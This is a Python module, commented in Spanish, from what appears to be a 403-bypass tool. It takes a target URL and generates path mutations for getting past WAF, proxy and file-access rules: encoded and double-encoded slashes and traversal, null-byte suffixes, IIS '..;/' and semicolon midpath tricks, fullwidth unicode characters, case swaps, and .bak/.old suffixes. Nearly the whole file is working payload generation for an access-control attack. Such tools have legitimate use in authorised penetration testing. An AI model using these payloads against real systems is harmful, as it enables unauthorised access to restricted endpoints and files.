from __future__ import annotations

from urllib.parse import urlsplit, urlunsplit

from bypass.models import PathMutatorResult, Payload, PayloadCategory


def path_mutations(path: str) -> list[tuple[str, Payload]]:
    """
    Variantes de ruta usadas a menudo en bypass de 403 (WAF, proxy, reglas de fichero).
    `path` es solo el path, p.ej. /admin o /v1/secret.
    """
    p = path if path.startswith("/") else f"/{path}"
    if p == "//":
        p = "/"
    segs = [s for s in p.split("/") if s]  # partes del path
    out: list[tuple[str, Payload]] = []

    def add(path_var: str, pid: str, label: str, **meta: object) -> None:
        v = path_var if path_var.startswith("/") else f"/{path_var}"
        pl = Payload(pid, PayloadCategory.PATH, label, dict(meta))
        out.append((v, pl))

    add(p, "path_baseline", "Ruta original (baseline)")

    if not p.endswith("/"):
        add(f"{p}/", "trailing_slash", "Añadir / al final")
    else:
        stripped = p.rstrip("/")
        add(stripped if stripped else "/", "strip_trailing_slash", "Quitar / final")

    if p not in ("/", "//") and p.rstrip("/"):
        add(f"{p.rstrip('/')}/.", "dot_segment", "Segmento /.")
        add(f"{p.rstrip('/')}//", "double_slash_end", "Doble / antes del final")
        add(f"{p.rstrip('/')}/./", "dot_dir_end", "Segmento /./ al final")
        add(f"{p.rstrip('/')}.", "trailing_dot", "Punto final")
        add(f"{p.rstrip('/')}.json", "ext_json_suffix", "Sufijo .json")
        add(f"{p.rstrip('/')}.bak", "ext_bak_suffix", "Sufijo .bak")
        add(f"{p.rstrip('/')}.old", "ext_old_suffix", "Sufijo .old")
        add(f"{p.rstrip('/')}.%00", "nullbyte_suffix", "Null byte en sufijo (%00)")
        add(f"{p.rstrip('/')}%2500", "double_nullbyte_suffix", "Null byte doble codificado (%2500)")
        add(f"{p.rstrip('/')}/%EF%BC%8F", "fullwidth_slash_suffix", "Slash unicode fullwidth")
        add(f"{p.rstrip('/')}/%EF%BC%8E", "fullwidth_dot_suffix", "Dot unicode fullwidth")

    # Primer segmento con %2e (evitar reglas estrictas en /)
    if segs:
        rest = "/".join(segs[1:]) if len(segs) > 1 else ""
        prefix = f"/%2e/{segs[0]}" if not rest else f"/%2e/{segs[0]}/{rest}"
        add(prefix, "first_seg_dot_encoded", "Prefijo /%2e/ sobre primer segmento")
        add(f"/{segs[0]}%2f{rest}" if rest else f"/{segs[0]}%2f", "encoded_slash_mid", "Slash codificado %2f")
        first = segs[0]
        if first:
            add(
                f"/%{ord(first[0]):x}{first[1:]}/{rest}" if rest else f"/%{ord(first[0]):x}{first[1:]}",
                "partial_char_encode_first_seg",
                "Primer caracter del segmento codificado",
            )
        add(f"/{segs[0]}/..;/{rest}" if rest else f"/{segs[0]}/..;/", "midpath_iis", "Midpath ..;/")
        add(f"/{segs[0]}/;/{rest}" if rest else f"/{segs[0]}/;/", "midpath_semicolon", "Midpath ;/")
        add(f"/{segs[0]}/%00/{rest}" if rest else f"/{segs[0]}/%00", "midpath_nullbyte", "Midpath null byte")
        add(
            f"/{segs[0]}/%EF%BC%8F/{rest}" if rest else f"/{segs[0]}/%EF%BC%8F",
            "midpath_fullwidth_slash",
            "Midpath slash fullwidth",
        )
        if len(segs) > 1:
            mid = "/".join(segs[:-1]) + "/./" + segs[-1]
            add("/" + mid, "midpath_dot_segment", "Segmento /./ en mitad")

    # Último segmento: mayúsculas / puntos URL-encoded
    if segs:
        last = segs[-1]
        alt_case = last.swapcase() if last != last.swapcase() else (last.lower() or last)
        if alt_case != last:
            new_segs = segs[:-1] + [alt_case]
            add("/" + "/".join(new_segs), "last_segment_case", "Mayúsculas en último segmento")
        if "." in last:
            new_last = last.replace(".", "%2e")
            if new_last != last:
                new_segs = segs[:-1] + [new_last]
                add("/" + "/".join(new_segs), "encode_dot_last", "Puntos %2e en último segmento")
        add("/" + "/".join(segs[:-1] + [f"%2e%2e%2f{last}"]), "encoded_traversal_last", "Traversal codificado antes del ultimo segmento")

    # ; en último segmento (IIS/ASP.NET)
    if segs:
        s2 = segs[:-1] + [f"{segs[-1]};"]
        add("/" + "/".join(s2), "semicolon_last", " ; en último segmento")

    # Sufijos raros
    if p.rstrip("/") and p != "/":
        base = p.rstrip("/")
        add(f"{base}/%20", "pct20_trail", "%20 al final del path")
        add(f"{base}/%09", "pct09_trail", "Tab al final del path (encoded)")
        add(f"{base}/.", "trailing_slash_dot", "/. al final")
        add(f"{base}/..;/", "iis_dotted", "Variante ..;/ (IIS)")
        add(f"{base}%2f", "encoded_slash_trail", "Slash final codificado")
        add(f"{base}%252f", "double_encoded_slash_trail", "Slash final doble codificado")
        add(f"{base}%252e", "double_encoded_dot_trail", "Punto final doble codificado")
        add(f"{base}\\", "backslash_trail", "Backslash final")
        add(f"/%252e%252e/{base.lstrip('/')}", "double_encoded_traversal", "Traversal doble codificado")

    # Deduplicar
    seen: set[str] = set()
    dedup: list[tuple[str, Payload]] = []
    for ap, pl in out:
        if ap in seen:
            continue
        seen.add(ap)
        dedup.append((ap, pl))
    return dedup


def build_full_url(
    scheme: str,
    netloc: str,
    path: str,
    query: str = "",
    fragment: str = "",
) -> str:
    path = path if path.startswith("/") else f"/{path}"
    return urlunsplit((scheme, netloc, path, query, fragment))


def all_path_variants(target_url: str) -> list[PathMutatorResult]:
    u = urlsplit(target_url)
    raw_path = u.path or "/"
    out: list[PathMutatorResult] = []
    for mut_path, pl in path_mutations(raw_path):
        full = build_full_url(
            u.scheme,
            u.netloc,
            mut_path,
            u.query,
            u.fragment,
        )
        out.append(PathMutatorResult(path=mut_path, payload=pl, full_url=full))
    return out
